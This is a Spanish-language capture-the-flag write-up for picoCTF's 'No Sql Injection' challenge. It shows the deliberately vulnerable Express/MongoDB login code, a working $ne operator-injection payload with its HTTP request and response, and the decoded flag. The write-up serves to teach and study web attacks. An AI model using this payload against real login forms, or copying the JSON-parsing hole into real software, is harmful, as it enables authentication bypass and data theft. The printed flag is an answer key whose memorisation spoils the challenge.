---
title: No Sql Injection
date: 2025-07-26 00:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, explotación web, no sql, mongodb]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---
>No Sql Injection
Author: NGIRIMANA Schadrack
Description
Can you try to get access to this website to get the flag? You can download the source here. The website is running here. Can you log in?
{: .prompt-tip }

Parece que tenemos que hacer fuerza bruta contra una página de login, las pistas dicen que "no solo existen las inyecciones SQL sino también las NoSQL", dando a entender que debemos buscar un tipo de inyección para una base de datos noSQL.

```html
 Login
Email:
Password:
```

Siguiendo las indiciciones descargo el código fuente.
``` shell
wget https://artifacts.picoctf.net/c_atlas/38/app.tar.gz
```

Ahora podemos echar un ojo a parte del código fuente de la aplicación

``` javascript
const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const { MongoMemoryServer } = require("mongodb-memory-server");
const path = require("path");
const crypto = require("crypto");

const app = express();
const port = process.env.PORT | 3000;

// Middleware to parse JSON data
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// User schema and model
const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  firstName: { type: String, required: true },
  lastName: { type: String, required: true },
  password: { type: String, required: true },
  token: { type: String, required: false, default: "{{Flag}}" },
});

const User = mongoose.model("User", userSchema);

// Initialize MongoMemoryServer and connect to it
async function startServer() {
  try {
    const mongoServer = await MongoMemoryServer.create();
    const mongoUri = mongoServer.getUri();
    await mongoose.connect(mongoUri);

    // Store initial user
    const initialUser = new User({
      firstName: "pico",
      lastName: "player",
      email: "picoplayer355@picoctf.org",
      password: crypto.randomBytes(16).toString("hex").slice(0, 16),
    });
    await initialUser.save();

    // Serve the HTML form
    app.get("/", (req, res) => {
      res.sendFile(path.join(__dirname, "index.html"));
    });

    // Serve the admin page
    app.get("/admin", (req, res) => {
      res.sendFile(path.join(__dirname, "admin.html"));
    });

    // Handle login form submission with JSON
    app.post("/login", async (req, res) => {
      const { email, password } = req.body;

      try {
        const user = await User.findOne({
          email:
            email.startsWith("{") && email.endsWith("}")
              ? JSON.parse(email)
              : email,
          password:
            password.startsWith("{") && password.endsWith("}")
              ? JSON.parse(password)
              : password,
        });

        if (user) {
          res.json({
            success: true,
            email: user.email,
            token: user.token,
            firstName: user.firstName,
            lastName: user.lastName,
          });
        } else {
          res.json({ success: false });
        }
      } catch (err) {
        res.status(500).json({ success: false, error: err.message });
      }
    });

    app.listen(port, () => {
    });
  } catch (err) {
    console.error(err);
  }
}

startServer().catch((err) => console.error(err));
```

De este código podemos obtener dos presuntas informaciones sobre este sistema, un email válido siempre va a existir en la aplicación **picoplayer355@picoctf.org**, pues se inicializa, este correo podría ser un vector de ataque de fuerza bruta dado ahora que conocemos el nombre de usuario (en este caso el email) de un usuario que se crea automáticamente.  Además tenemos una línea de código que revela el uso del MongoDB.

``` javascript
const { MongoMemoryServer } = require("mongodb-memory-server");
```
Parece que habrá que probar payloads NoSQL. Es un ataque que consiste en truncar la lógica del motor de MongoDB para obtener resultados inesperados en la lógica de la aplicación, comienzo a probar payloads.

``` html
POST http://atlas.picoctf.net:58649/login HTTP/1.1
host: atlas.picoctf.net:58649
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://atlas.picoctf.net:58649/
Content-Type: application/json
content-length: 64
Origin: http://atlas.picoctf.net:58649
Connection: keep-alive
Priority: u=0

{"email":"picoplayer355@picoctf.org","password":" {"$ne": "a"}"}
```
Respuesta 
```html
HTTP/1.1 400 Bad Request
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 918
Date: Fri, 25 Jul 2025 21:35:13 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected token $ in JSON at position 52<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/app/node_modules/body-parser/lib/types/json.js:92:19)<br> &nbsp; &nbsp;at /app/node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<br> &nbsp; &nbsp;at invokeCallback (/app/node_modules/raw-body/index.js:238:16)<br> &nbsp; &nbsp;at done (/app/node_modules/raw-body/index.js:227:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/app/node_modules/raw-body/index.js:287:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:525:35)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1358:12)<br> &nbsp; &nbsp;at processTicksAndRejections (node:internal/process/task_queues:83:21)</pre>
</body>
</html>
```
La respuesta "Unexpected token $ in JSON at position 52" da a entender que hay que escapar algunos carácteres y jugar con la sintaxis, así que pruebo varias veces y finalmente el payload es el siguiente, escapando las comillas dobles ""

``` json
{"email":"picoplayer355@picoctf.org","password":"{\"$ne\": \"a\"}"}
```

``` html
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 186
ETag: W/"ba-hs16MdMy+WdMG1PuiylPpkCwgrU"
Date: Fri, 25 Jul 2025 21:41:10 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"success":true,"email":"picoplayer355@picoctf.org","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzI1YmE0ZGUxfQ==","firstName":"pico","lastName":"player"}
```

Decodificamos el token con base64

``` shell
pablo☠office no-sql-injection$ echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzI1YmE0ZGUxfQ" | base64 -d
picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_25ba4de1}base64: entrada inválida
```

flag: **picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_25ba4de1}**

Truncando la lógica de bases de datos de datos documentales. 
